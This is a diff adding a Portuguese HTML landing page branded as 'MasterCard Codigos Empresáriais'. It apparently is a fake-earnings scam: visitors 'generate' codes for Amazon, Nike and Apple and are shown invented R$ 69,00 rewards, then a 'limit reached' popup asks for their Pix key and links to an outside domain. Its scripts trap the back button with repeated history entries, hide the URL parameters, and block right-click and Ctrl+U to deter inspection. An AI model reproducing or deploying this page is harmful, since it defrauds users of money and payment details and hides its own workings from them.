@@ -1,0 +1,980 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link data-optimized="1" rel="stylesheet" href="css/5921624bf5bbe4c8c091ef09226fa76f.css">
+        <script async="" src="js/fbevents.js"></script><script src="js/lordicon.js"></script>
+        <link rel="preconnect" href="https://fonts.googleapis.com/">
+        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+        <link data-optimized="1" href="css/1c7a3d2ee9759dc256d915300855c494.css" rel="stylesheet">
+        <link data-optimized="1" href="css/ba9cbbe9240a489628be8eb27c56db8a.css" rel="stylesheet">
+        <link rel="stylesheet" href="css/style.css">
+        <link rel="stylesheet" href="css/animated.css">
+        <title>MasterCard Codigos Empresáriais</title>
+
+        <!-- Meta Pixel Code -->
+            <script async="" src="js/fbevents_1.js"></script><script>
+            !function(f,b,e,v,n,t,s)
+            {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+            n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+            if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+            n.queue=[];t=b.createElement(e);t.async=!0;
+            t.src=v;s=b.getElementsByTagName(e)[0];
+            s.parentNode.insertBefore(t,s)}(window, document,'script',
+            'https://connect.facebook.net/en_US/fbevents.js');
+            fbq('init', '905287817650292');
+            fbq('track', 'PageView');
+            </script>
+            <noscript><img height="1" width="1" style="display:none"
+            src="https://www.facebook.com/tr?id=905287817650292&ev=PageView&noscript=1"
+            /></noscript>
+        <!-- End Meta Pixel Code -->
+    </head>
+
+    <body>
+        <div class="menu">
+            <a><img src="images/logo.png"></a>
+            <div class="buttons-container">
+                <div class="valor-box">
+                    <span id="valor" style="font-family: 'Montserrat', sans-serif;">R$ 0.00</span>
+                </div>
+            </div>
+        </div>
+
+        <div style="margin-bottom: 100px;"></div>
+
+
+        <div id="p1" style="display: block;">
+            <div class="slogan-inicio">
+                <div>
+                    <p style="color: white; font-weight: bold; font-size: 20px; padding-top: 15px;">Nos ajude a organizar os códigos das empresas!</p>
+                </div>
+            </div>
+
+            <div style="margin-bottom: 20px;"></div>
+
+
+            <div class="white-box">
+                <img src="images/amazon.png" style="width: 150px; margin: 0 auto; display: flex; padding-top: 10px;">
+
+                <button id="gerarCodigo" class="gerarCodigo">Gerar Código</button>
+
+                <div id="codigoGerado" style="display: none;">
+                    <p style="margin-top: 20px; text-align: center; ">Código gerado com sucesso:</p>
+                    <p id="codigoAleatorio" style="font-weight: bold; margin-top: -15px; text-align: center; margin-bottom: -10px; font-size: 25px;"></p>
+                </div>
+                    
+                <div id="pythonGenerator" style="padding-top: 20px;">
+                    <label for="chatId" style="background-color: #e2e8ef; padding: 10px; border-radius: 12px; text-align: center; width: 100%; margin-bottom: 10px;">Insira o código gerado abaixo:</label>
+                    <input type="text" id="chatId" name="chatId" style="border-radius: 12px; height: 40px;">
+
+                        <!-- Botão de envio -->
+                    <input type="submit" value="Enviar" class="enviarCodigo" id="B1" onclick="funcao(); return false;">
+                </div>
+
+            </div>
+
+            <div class="popup-container" id="popupB1">
+                <script data-optimized="1" src="js/c53f77ae20425ecce9172a7e108fa681.js"></script>
+                <img src="images/heart.gif" style="height: 100px; width: 100px; display: block; margin: auto;">
+                <span class="popup-text" style="font-size: 20px;">Saldo atualizado!</span>
+                <span class="popup-text" style="font-size: 20px;">Você recebeu:</span>
+                <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -20px;">R$ 69,00</span>
+                <span class="popup-text" style="font-size: 20px;">pelo código da Amazon</span>
+            </div>
+        </div>
+
+
+
+        <div id="p2" style="display: none;">
+
+            <div class="white-box">
+                <img decoding="async" src="images/nike.png" style="width: 150px; margin: 0 auto; display: flex; padding-top: 10px;">
+                <button id="gerarCodigo2" class="gerarCodigo">Gerar Código</button>
+
+                <div id="codigoGerado2" style="display: none;">
+                    <p style="margin-top: 20px; text-align: center; ">Código gerado com sucesso:</p>
+                    <p id="codigoAleatorio2" style="font-weight: bold; margin-top: -15px; text-align: center; margin-bottom: -10px; font-size: 25px;"></p>
+                </div>
+                    
+                <div id="pythonGenerator" style="padding-top: 20px;">
+                    <label for="chatId2" style="background-color: #e2e8ef; padding: 10px; border-radius: 12px; text-align: center; width: 100%; margin-bottom: 10px;">Insira o código gerado abaixo:</label>
+                    <input type="text" id="chatId2" name="chatId" style="border-radius: 12px; height: 40px;">
+
+                        <!-- Botão de envio -->
+                    <input type="submit" value="Enviar" class="enviarCodigo" id="B1" onclick="funcao2(); return false;">
+                </div>
+            </div>
+
+            <div class="popup-container" id="popupB2">
+                <script data-optimized="1" src="js/c53f77ae20425ecce9172a7e108fa681.js"></script>
+                <img src="images/heart.gif" style="height: 100px; width: 100px; display: block; margin: auto;">
+                <span class="popup-text" style="font-size: 20px;">Saldo atualizado!</span>
+                <span class="popup-text" style="font-size: 20px;">Você recebeu:</span>
+                <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -20px;">R$ 69,00</span>
+                <span class="popup-text" style="font-size: 20px;">pelo código da Nike</span>
+            </div>
+
+        </div>
+
+
+
+        <div id="p3" style="display: none;">
+
+            <div class="white-box">
+                <img decoding="async" src="images/apple.png" style="width: 150px; margin: 0 auto; display: flex; padding-top: 10px;">
+                <button id="gerarCodigo3" class="gerarCodigo">Gerar Código</button>
+
+                <div id="codigoGerado3" style="display: none;">
+                    <p style="margin-top: 20px; text-align: center; ">Código gerado com sucesso:</p>
+                    <p id="codigoAleatorio3" style="font-weight: bold; margin-top: -15px; text-align: center; margin-bottom: -10px; font-size: 25px;"></p>
+                </div>
+                    
+                <div id="pythonGenerator" style="padding-top: 20px;">
+                    <label for="chatId3" style="background-color: #e2e8ef; padding: 10px; border-radius: 12px; text-align: center; width: 100%; margin-bottom: 10px;">Insira o código gerado abaixo:</label>
+                    <input type="text" id="chatId3" name="chatId" style="border-radius: 12px; height: 40px;">
+
+                        <!-- Botão de envio -->
+                    <input type="submit" value="Enviar" class="enviarCodigo" id="B3" onclick="funcao3(); return false;">
+                </div>
+            </div>
+
+            <div class="popup-container" id="popupB3">
+                <script data-optimized="1" src="js/c53f77ae20425ecce9172a7e108fa681.js"></script>
+                <img src="images/heart.gif" style="height: 100px; width: 100px; display: block; margin: auto;">
+                <span class="popup-text" style="font-size: 20px;">Saldo atualizado!</span>
+                <span class="popup-text" style="font-size: 20px;">Você recebeu:</span>
+                <span class="popup-text" style="font-size: 40px; font-weight: bold; font-family: 'Montserrat', sans-serif; margin-top: -20px;">R$ 69,00</span>
+                <span class="popup-text" style="font-size: 20px;">pelo código da Apple</span>
+            </div>
+
+        </div>
+
+
+
+        <link rel="stylesheet" href="css/FMX2lJf7OBPJ.css">
+        <link rel="stylesheet" href="css/k9Ct3RSAtkff.css">
+        <link rel="stylesheet" href="css/NwzNsIr3C5eS.css">
+        <link rel="stylesheet" href="css/rvM6P66Hpsa5.css">
+        <link rel="stylesheet" href="css/SzpZgiRaHK5z.css">
+        <link rel="stylesheet" href="css/waEsgMVvqpCq.css">
+        <link rel="stylesheet" href="css/Zk6amTpdW19x.css">
+
+
+        
+  <style>
+       body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+    
+    /* Menu de cima */
+    
+    .menu {
+      position: fixed;
+      top: 1%;
+      width: 95%;
+      height: 85px; /* Ajuste a altura desejada */
+      background: linear-gradient(180deg, red);
+      display: flex;
+      margin: 0 auto;
+      justify-content: space-between;
+      padding: 10px;
+      box-sizing: border-box;
+      z-index: 9998; /* Para garantir que o menu fique acima de outros elementos */
+      border-radius: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+    
+    .menu::before {
+      content: "";
+      position: absolute;
+	  color: white;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(180deg, ,red);
+      z-index: -1;
+      border-radius: 20px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+    }
+    
+    .menu a {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      color: #fff;
+    }
+    
+    
+    .menu a img {
+      max-width: 100%; /* Ajuste o tamanho máximo da imagem */
+      max-height: 100%; /* Ajuste o tamanho máximo da imagem */
+      display: block;
+    }
+
+    .buttons-container {
+      display: flex;
+      align-items: center;
+      padding: 10px;
+    }
+
+    .valor-box {
+      width: 150px;
+      height: 40px;
+      background: linear-gradient(135deg, orange);
+      border-radius: 12px;
+      box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+      padding: 10px;
+      align-items: center;
+      line-height: 20px;
+      display: block;
+      margin: 0 auto;
+    }
+    
+    .valor-box-saque {
+      width: 95%;
+      height: 130px;
+      background-color: #ccc;
+      border-radius: 12px;
+      box-shadow: 0 0 5px rgba(0, 0, 0, 0.2);
+      padding: 10px;
+      align-items: center;
+      line-height: 20px;
+      display: block;
+      margin: 0 auto;
+      background-image: linear-gradient(125deg, red);
+
+    }
+
+    .valor-box span {
+      font-weight: bold;
+      font-size: 20px;
+    }
+    
+    #valor {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-weight: bold;
+      font-size: 20px;
+      color: white;
+    }
+    
+    #valor-saque {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-weight: bold;
+      font-size: 21px;
+    }
+
+    /* Menu de baixo */
+
+    .menuemb {
+      position: fixed;
+      bottom: 1%;
+      width: 95%;
+      background: linear-gradient(180deg, black, #232323);
+      display: flex;
+      margin: 0 auto;
+      justify-content: space-between;
+      padding: 10px;
+      box-sizing: border-box;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.4);
+      border-radius: 20px;
+    }
+
+    
+    .menuemb a {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      text-decoration: none;
+      color: white;
+      height: 50px;
+    }
+
+    .menuemb a img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+
+
+    /* BOTÕES LIKE E DISLIKE*/
+    .like-dislike-buttons {
+      display: flex;
+      justify-content: center;
+      gap: 0px;
+    }
+
+    .like-button, .dislike-button {
+      border: 2px solid;
+      padding: 10px;
+      cursor: pointer;
+      transition: background-color 0.2s, color 0.2s;
+      text-align: center; /* Centraliza o texto */
+      margin: 0 auto;
+      right: 5%;
+      left: 5%;
+    }
+
+    .like-button {
+      border-color: green;
+      color: green;
+      width: 49%;
+      right: 5%;
+      left: 5%;
+      border-radius: 8px;
+    }
+
+    .dislike-button {
+      border-color: red;
+      color: red;
+      width: 49%;
+      right: 5%;
+      left: 5%;
+      border-radius: 8px;
+    }
+
+    .liked {
+      background: linear-gradient(180deg, green, green);
+      color: #fff;
+    }
+    
+    .disliked {
+      background: linear-gradient(180deg, red, red);
+      color: #fff;
+    }
+
+    
+
+    .button-container {
+      display: flex;
+      width: 100%;
+      justify-content: center;
+      align-items: center;
+
+    }
+
+    .square-button {
+      border-radius: 12px;
+      width: 80px;
+      height: 80px;
+      border: none;
+      margin: 5px;
+      background-color: #ccc;
+      color: #fff;
+      cursor: pointer;
+      transition: transform 0.2s, background-color 0.2s;
+    }
+
+    .square-button img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover; /* Redimensiona a imagem para preencher o botão */
+    }
+
+    .square-button.active {
+      background: linear-gradient(135deg, #28a745, #06641c);
+      transform: scale(1.2);
+    }
+
+    .input-container {
+      width: 100%;
+      max-width: 400px;
+      padding: 10px;
+      box-sizing: border-box;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .input-container input[type="text"] {
+      width: 100%;
+      font-size: 15px;
+      color: #303030;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* POPUP SAQUE */
+
+    .popup-container {
+      position: fixed;
+      border-radius: 20px;
+      top: 50%;
+      left: 50%;
+      width: 90%;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      padding: 20px;
+      box-shadow: 0 0 100px rgba(0, 0, 0, 10);
+      display: none;
+      z-index: 10000;
+    }
+
+    .popup-text {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 10px;
+      display: block;
+      text-align: center;
+    }
+
+    .popup-button {
+      background-color: #FF0000;
+      width: 95%;
+      border-radius: 8px;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 14px;
+      cursor: pointer;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .desbloquear-button {
+      background: linear-gradient(135deg, #28a745, #06641c);
+      width: 95%;
+      border-radius: 8px;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 14px;
+      cursor: pointer;
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* POPUP LIMITE DE SAQUE */
+
+    .popup-containerL {
+      position: fixed;
+      border-radius: 20px;
+      top: 50%;
+      left: 50%;
+      width: 90%;
+      transform: translate(-50%, -50%);
+      background-color: #fff;
+      padding: 20px;
+      box-shadow: 0 0 100px rgba(0, 0, 0, 10);
+      display: none;
+      z-index: 9999;
+    }
+
+    .popup-textL {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 10px;
+      display: block;
+      text-align: center;
+    }
+
+    .popup-buttonL {
+      background-color: #FF0000;
+      width: 95%;
+      border-radius: 8px;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 14px;
+      cursor: pointer;
+      display: block;
+      margin: 0 auto;
+    }
+
+    .desbloquear-buttonL {
+      background: linear-gradient(135deg, #28a745, #06641c);
+      width: 95%;
+      border-radius: 8px;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 14px;
+      cursor: pointer;
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* Style dos ícones do Google */
+
+    .material-symbols-outlined {
+      font-variation-settings:
+      'FILL' 1,
+      'wght' 600,
+      'GRAD' 0,
+      'opsz' 30;
+    }
+    
+    /* Barra de carregamento */
+    
+    #progress-bar {
+        width: 95%;
+        height: 20px;
+        background-color: #ddd;
+        position: relative;
+        border-radius: 8px;
+        overflow: hidden;
+        margin: 0 auto;
+    }
+        
+    #progress-bar div {
+        height: 100%;
+        position: absolute;
+        left: 0;
+        top: 0;
+        background-color: #ff0000;
+        animation: progress 86400s linear; /* ajustar segundos */
+        animation-fill-mode: forwards;
+        animation-iteration-count: 1;
+    }
+        
+    @keyframes progress {
+        from { width: 0%; }
+        to { width: 100%; }
+    }
+    
+    
+    /* Caixa de login */
+    
+    .loginbox {
+      width: 90%; /* Largura do retângulo */
+      height: 270px; /* Altura do retângulo */
+      background-color: #d9d9d9; /* Cor de fundo do retângulo */
+      border-radius: 20px; /* Raio dos cantos do retângulo */
+      display: block;
+      margin: 0 auto;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.5);
+    }
+    
+    .input-container {
+      width: 100%;
+      max-width: 400px;
+      padding: 10px;
+      box-sizing: border-box;
+    }
+
+    .input-container label {
+
+      display: block;
+      font-size: 17px;
+      font-weight: bold;
+      color: #007bff;
+      margin-bottom: 10px; /* Espaçamento entre o título e a caixa */
+    }
+
+    .input-container input[type="text"] {
+      width: 96%;
+      font-size: 15px;
+      color: #007bff;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Estilo para a bolinha girando */
+    .loading-spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 4px solid rgba(0, 0, 0, 0.3);
+      border-top: 4px solid #28a745;
+      border-radius: 50%;
+      animation: spin 1.5s linear infinite;
+      vertical-align: middle;
+    }
+    
+    .prosseguir-button {
+      background: linear-gradient(135deg, #28a745, #06641c);
+      width: 90%;
+      border-radius: 8px;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+      display: block;
+      font-weight: bold;
+      margin: 0 auto;
+    }
+    
+    .prosseguir-button1 {
+      background: linear-gradient(135deg, #28a745, #06641c);
+      width: 90%;
+      border-radius: 8px;
+      color: #fff;
+      border: none;
+      padding: 10px 20px;
+      font-size: 14px;
+      cursor: pointer;
+      display: block;
+      margin: 0 auto;
+    }
+    
+    
+    /* Sinal do mines */
+    table {
+      height: 50%;
+      width: 50%;
+      border-spacing: 0;
+      display: block;
+      margin: 0 auto;
+    }
+    
+    table td {
+      width: 40px;
+      height: 40px;
+      padding: 0;
+      border-spacing: 0; /* Remova o espaçamento entre células */
+      background-color: #fff;
+      text-align: center; /* Centraliza horizontalmente */
+      vertical-align: middle; /* Centraliza verticalmente */
+    }
+    
+    img {
+      max-width: 100%;
+      max-height: 100%;
+      display: block;
+      margin: auto;
+    }
+    
+     /* iframe casa de aposta */
+    
+    .preview-container {
+        position: relative;
+        padding-bottom: 150%; /* 16:9 aspect ratio */
+        height: 0;
+        overflow: hidden;
+        margin: 20px auto;
+        width: 90%;
+        max-width: 800px;
+        background-color: #fff;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.3);
+        border-radius: 5px;
+    }
+    
+    .preview-container iframe {
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        border: none;
+    }
+
+     /* sinal do mines */
+
+    .card-container {
+      display: flex;
+      justify-content: center;
+      margin-top: 20px;
+      width: 100%;
+      width: 97%;
+      margin: 0 auto;
+    }
+
+    .card {
+      width: 100%;
+      background-color: #202020;
+      color: #ffffff;
+      padding: 5px;
+      margin: 4px;
+      border-radius: 20px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);
+      max-width: 100%;
+      text-align: center;
+    }
+
+    .card-title {
+      font-size: 21px;
+      font-weight: bold;
+      color: #ffffff;
+    }
+
+    .card .card-title {
+      font-size: 12px;
+      margin-top: 10px;
+    }
+
+
+    .card-content {
+    }
+
+    .output-value {
+      font-size: 35px;
+      font-weight: bold;
+      margin-top: 10px;
+      color: #ffffff;
+    }
+
+    #timer {
+      font-size: 35px;
+      font-weight: bold;
+      margin-top: 10px;
+      color: #ffffff;
+    }
+    
+    
+    .menu-image {
+      width: 75%; /* Para ajustar a largura da imagem ao link */
+      padding-top: 75%; /* Proporção de largura para altura (exemplo: 3:4) */
+      background-size: cover; /* Redimensiona a imagem para cobrir todo o elemento */
+      background-position: center; /* Centraliza a imagem */
+    }
+    
+    .criar-conta {
+      background-color: #d9d9d9;
+      width: 90%;
+      border-radius: 8px;
+      color: #4a4a4a;
+      border: none;
+      padding: 10px 20px;
+      font-size: 14px;
+      cursor: pointer;
+      display: block;
+      margin: 0 auto;
+    }
+
+    /* Notificação de dinheiro */
+
+    .notificacaoDinheiro {
+        display: none;
+        margin: 0 auto;
+        position: fixed;
+        top: -100px; /* Posiciona a notificação acima da tela */
+        left: 0;
+        right: 0;
+        color: #333;
+        text-align: center;
+        box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.4);
+        background-image: linear-gradient(125deg, #5575FD, #2B50F0);
+        z-index: 9999;
+        height: 50px;
+        width: 60%;
+        border-radius: 20px;
+        padding-bottom: 10px;
+        padding-top: 10px;
+    }
+        
+    .notificacaoDinheiro.activeDinheiro {
+        display: block;
+        animation: slideInDinheiro 0.5s forwards;
+    }
+        
+    .notificacaoDinheiro.activeDinheiro.slideOutDinheiro {
+        animation: slideOutDinheiro 0.5s forwards;
+    }
+        
+    @keyframes slideInDinheiro {
+        from {
+            top: -100px;
+        }
+        to {
+            top: 0;
+        }
+    }
+        
+    @keyframes slideOutDinheiro {
+        from {
+            top: 0;
+        }
+        to {
+            top: -100px;
+        }
+    }
+    
+    /* Slogan inicio */
+    
+    .slogan-inicio {
+        display: flex;
+        margin: 0 auto;
+        justify-content: center; 
+        align-items: center;
+        background-color: #7a7a7a;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.3);
+        height: 70px;
+        width: 95%;
+        border-radius: 20px;
+        padding-top: 15px;
+        padding-bottom: 15px;
+        padding-left: 15px;
+        padding-right: 15px;
+    }
+    
+    .white-box {
+        display: block;
+        margin: 0 auto;
+        background-color: white;
+        height: 100%;
+        width: 95%;
+        border-radius: 20px;
+        padding-top: 15px;
+        padding-bottom: 15px;
+        padding-left: 15px;
+        padding-right: 15px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    }
+    
+    .wbc {
+        text-align: center;
+    }
+    
+    .centro {
+      display: block;
+      margin: 0 auto;
+      background-color: white;
+      height: 100%;
+      width: 95%;
+      border-radius: 20px;
+      padding-top: 15px;
+      padding-bottom: 15px;
+      padding-left: 15px;
+      padding-right: 15px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+    }
+
+    
+  </style>
+
+        <div class="popup-containerL" id="popupL">
+            <script src="js/ogMGp7l9vx9j.js"></script>
+            <!-- //pernambuco -->
+            <lord-icon src="./fonts/opinicash/js/inrunzby.json" trigger="loop" delay="2000" colors="primary:#ffc738,secondary:#000000" style="width:125px;height:125px; display: flex; margin: 0 auto;">
+            </lord-icon>
+            
+            
+            <span class="popup-textL" style="font-size: 24px; font-weight: bold;">LIMITE ATINGIDO.</span>
+      
+            <div style="margin-bottom: 15px;"></div>
+            
+            <p class="popup-textL" style="margin-bottom: 10px; font-size: 18px; font-weight: bold;">Agora, nos forneça sua chave pix para que possamos depositar o valor em sua conta</p>
+            
+            
+            <button class="desbloquear-buttonL" style="font-weight: bold; background-color: 	#00C45A;" href="https://materia-oficial.online/m2" onclick="window.location.href='#'">CLIQUE AQUI</button>
+            
+            <div style="margin-bottom: 15px;"></div>
+            
+            <p class="popup-textL" style="margin-bottom: 0px;">APÓS ISSO, VOCÊ PODERÁ RESPONDER MAIS ALGUNS CÓDIGOS</p>
+            <p class="popup-textL">CONTINUE NOS AJUDANDO PARA RECEBER MAIS</p>
+            
+            <div id="progress-bar">
+              <div></div>
+            </div>
+            
+            <div style="margin-bottom: 10px;"></div>
+            
+            <div class="popup-buttonL-container" style="display: none;">
+              <button class="popup-buttonL" style="color:white;" onclick="fecharPopupEAgendarReaparecimento()">Continuar avaliando</button>
+            </div>
+      
+      
+      
+            
+            
+          </div>
+      
+
+        <script src="js/jquery.min.js"></script>
+        <script src="js/code.js"></script>
+        <script>
+            jQuery(document).ready(function(){
+            function limpaUrl() {     //função
+                urlpg = $(location).attr('href');   //pega a url atual da página
+                urllimpa = urlpg.split("?")[0]      //tira tudo o que estiver depois de '?'
+
+                window.history.replaceState(null, null, urllimpa); //subtitui a url atual pela url limpa
+            } 
+
+            setTimeout(limpaUrl, 1) //chama a função depois de 4 segundos
+            });
+
+            function queryString(parameter) {  
+                var loc = location.search.substring(1, location.search.length);   
+                var param_value = false;   
+                var params = loc.split("&");   
+                for (i=0; i<params.length;i++) {   
+                    param_name = params[i].substring(0,params[i].indexOf('='));   
+                    if (param_name == parameter) {                                          
+                        param_value = params[i].substring(params[i].indexOf('=')+1)   
+                    }   
+                }   
+                if (param_value) {   
+                    return param_value;   
+                }   
+                else {   
+                    return false;   
+                }   
+            }
+
+            history.pushState({}, "", location.href);
+            history.pushState({}, "", location.href);
+        </script>
+
+        <script>
+            var message="";
+            function clickIE() {
+                if (document.all) {(message);return false;}
+            }
+            function clickNS(e) {
+                if(document.layers||(document.getElementById&&!document.all)) {
+                    if (e.which==2||e.which==3) {(message);return false;}
+                }
+            }
+            if (document.layers){
+                document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;
+            }
+            else{
+                document.onmouseup=clickNS;document.oncontextmenu=clickIE;
+            }
+            document.oncontextmenu=new Function("return false")
+
+
+            //  F12
+            //==========
+
+            document.onkeypress = function (event) {
+                if (e.ctrlKey && (e.keyCode === 123)) {
+                    // alert('not allowed');
+                    return false;
+                }
+            };
+
+
+            //    CTRL + u
+            //==============
+
+            document.onkeydown = function(e) {
+                if (e.ctrlKey && (e.keyCode === 85)) {
+                    // alert('not allowed');
+                    return false;
+                }
+            };  
+        </script>
+
+    
+
+
+
+    <footer>
+        <p style="color: #ffffff; text-align: center; font-size: 12px; margin-top: 10px;">©️ 2023 Todos os direitos reservados.</p>
+    </footer>
+
+</body></html>
